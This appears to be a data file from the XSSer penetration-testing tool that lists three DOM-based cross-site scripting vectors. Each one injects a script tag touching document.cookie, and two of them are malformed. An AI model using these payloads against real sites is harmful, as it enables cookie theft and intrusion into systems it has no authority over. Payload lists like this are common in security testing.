## XXSer.py @@ DOM vectors @@ psy
#
## This file contains different XSS vectors to inject in the Document Object Model (DOM).
## If you have some new vectors, please email me to [root@lordepsylon.net] and i will add your list to XSSer framework.
## After, all people who wants to update the tool only will need to do: (python XSser.py --update)
## Thats all.
###
## Happy Cross Hacking! ;)

DOMvectors = {
		'1' : """notname=<script>(document.cookie)</script>""",
		'2' : """notname=<script>alert(document.cookie)<script>&""",
		'3' : """foobar=name=<script>alert(document.cookie)<script>&""",
	
		}


